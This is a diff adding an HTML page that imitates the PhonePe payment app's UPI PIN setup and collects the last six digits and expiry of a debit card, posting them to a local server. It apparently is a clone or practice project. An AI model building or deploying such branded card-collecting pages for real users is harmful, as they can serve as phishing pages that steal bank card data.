@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhonePe: UPI Payments, Investment, Insurance, Recharges, DTH &amp; More</title>
+    <link rel="shortcut icon" href="./Icons/logo.webp" class="logo" type="image/x-icon">
+</head>
+<style>
+    main {
+        margin: clamp(2rem, 8vw, 6rem) auto;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        width: clamp(18rem, 90vw, 30rem);
+        border: 0.1rem solid #7B2CBF;
+        border-radius: 1rem;
+        box-shadow: 0 0.25rem 1rem rgba(123, 44, 191, 0.25);
+        padding: clamp(1rem, 4vw, 1.8rem);
+        background: #fff;
+    }
+
+    .container> :nth-child(1) {
+        font-size: clamp(1.2rem, 3vw, 2rem);
+        color: #7B2CBF;
+        text-align: center;
+    }
+
+    .container> :nth-child(2) {
+        font-size: clamp(0.85rem, 2.5vw, 1.3rem);
+        text-align: center;
+    }
+
+    .container> :nth-child(4) {
+        font-size: clamp(0.75rem, 2.3vw, 1.1rem);
+        text-align: center;
+    }
+
+    .debitcard {
+        width: 100%;
+        display: flex;
+        align-items: center;
+        gap: clamp(0.8rem, 3vw, 2rem);
+        border-top: 0.1rem solid #000;
+        border-bottom: 0.1rem solid #000;
+        padding: clamp(0.8rem, 3vw, 1.2rem);
+    }
+
+    .debitcard b {
+        font-size: clamp(0.9rem, 2.5vw, 1.3rem);
+    }
+
+    .debitcard p {
+        font-size: clamp(0.7rem, 2.3vw, 1rem);
+        line-height: 1.3;
+    }
+
+    .credit {
+        width: clamp(1.2rem, 4vw, 2rem);
+        height: clamp(1.2rem, 4vw, 2rem);
+    }
+
+    .container input {
+        width: clamp(1.1rem, 4vw, 1.5rem);
+        height: clamp(1.1rem, 4vw, 1.5rem);
+        border-radius: 0.4rem;
+    }
+
+    .bottom {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 1rem;
+    }
+
+    /* BUTTON */
+    .bottom> :nth-child(2) {
+        width: 100%;
+        padding: clamp(0.7rem, 3vw, 1rem);
+        background-color: #7B2CBF;
+        color: #fff;
+        font-weight: 700;
+        font-size: clamp(0.9rem, 2.5vw, 1.1rem);
+        border: none;
+        border-radius: 1rem;
+        cursor: pointer;
+    }
+
+    .container1 b {
+        font-size: clamp(1.2rem, 3vw, 2rem);
+        color: #7B2CBF;
+    }
+
+    .container1 p {
+        font-size: clamp(0.85rem, 2.5vw, 1.3rem);
+        text-align: center;
+
+    }
+
+    .box {
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        gap: 0.5rem;
+        margin-top: 4rem;
+        font-size: clamp(0.6rem, 2.5vw, 1.2rem);
+
+    }
+
+    .box input,
+    .box1 input {
+        padding: 1rem 1rem;
+        border: 0.1rem solid #7B2CBF;
+        border-radius: 1rem;
+        width: clamp(10rem, 20vw, 12.5rem);
+    }
+
+    .box1 {
+        margin-top: 2rem;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        gap: 0.5rem;
+        font-size: clamp(0.6rem, 2.5vw, 1.2rem);
+    }
+
+    button {
+        width: 100%;
+        padding: clamp(0.7rem, 3vw, 1rem);
+        background-color: #7B2CBF;
+        color: #fff;
+        font-weight: 700;
+        font-size: clamp(0.9rem, 2.5vw, 1.1rem);
+        border: none;
+        border-radius: 1rem;
+        cursor: pointer;
+        margin-top: 2rem;
+    }
+</style>
+
+<body>
+    <main>
+        <div id="container" class="container">
+            <b>Set upi pin to make payments</b>
+            <p>Verify debit Card details to Set Pin</p>
+            <div class="debitcard">
+                <img src="./Icons/creditcard.svg" alt="credit card" class="credit">
+                <div class="sub">
+                    <b>Debit / ATM card</b>
+                    <p>please keep your Debit/ATM card <br> handy for the next setup</p>
+                </div>
+                <input type="checkbox" name="checkbox" id="checkbox">
+            </div>
+            <p>By continuing I consent the Bank to Collect use my <br>
+                Debit/ATM card Number for setting UPI pin and <br>
+                authenticate my identity to provide UPI nased payment facilities.</p>
+            <div class="bottom">
+                <img id="upi" src="./Icons/UPI.png" alt="Upilogo">
+                <button id="continue" type="button">Continue</button>
+            </div>
+        </div>
+        <div id="container1" class="container1">
+            <b>Verify Debit Card Details</b>
+            <p>Enter card detais of your <span id="bankname"></span> account</p>
+            <div class="box">
+                <label for="card number">Enter the last 6 digits of card number</label>
+                <input id="input1" type="text" inputmode="numeric" pattern="\d{6}" maxlength="6"
+                    placeholder="Enter 6-digit code" autocomplete="one-time-code" />
+            </div>
+            <div class="box1">
+                <label for="Expirydate">Expiry date</label>
+                <input id="input2" type="text" inputmode="numeric" placeholder="MM / YY" maxlength="5"
+                    autocomplete="cc-exp" />
+            </div>
+            <button id="continue1" type="button">Continue</button>
+        </div>
+    </main>
+    <script>
+        const container = document.getElementById('container');
+        const container1 = document.getElementById('container1');
+        const button = document.getElementById('continue');
+        const button1 = document.getElementById('continue1');
+        const checkbox = document.getElementById('checkbox');
+
+        container1.style.display = "none";
+
+        // first continue
+        button.addEventListener("click", () => {
+            if (checkbox.checked) {
+                container.style.display = "none";
+                container1.style.display = "block";
+            }
+        });
+
+        // expiry input element (NOT value)
+        const expiryInput = document.getElementById("input2");
+
+        // auto-format expiry
+        expiryInput.addEventListener("input", () => {
+            let value = expiryInput.value.replace(/\D/g, "");
+
+            if (value.length >= 3) {
+                value = value.slice(0, 2) + "/" + value.slice(2, 4);
+            }
+
+            expiryInput.value = value.slice(0, 5);
+        });
+
+        // verify card
+        button1.addEventListener("click", async () => {
+
+            // read values ONLY on click
+            const cardnumber = document.getElementById('input1').value.trim();
+            const cardExpiry = expiryInput.value.trim();
+
+            if (!cardnumber || !cardExpiry) {
+                alert("Enter card number and expiry");
+                return;
+            }
+
+            try {
+                const res = await fetch("http://localhost:1300/verify-card", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        cardNumber: cardnumber,
+                        expiry: cardExpiry
+                    })
+                });
+
+                const data = await res.json();
+
+                if (data.success) {
+                    alert("Phonepe Account is active now");
+                    window.location.href = "Main.html";
+                } else {
+                    alert(data.message || "Failed");
+                }
+
+            } catch (err) {
+                console.error(err);
+                alert("Server error");
+            }
+        });
+    </script>
+
+</body>
+
+</html>
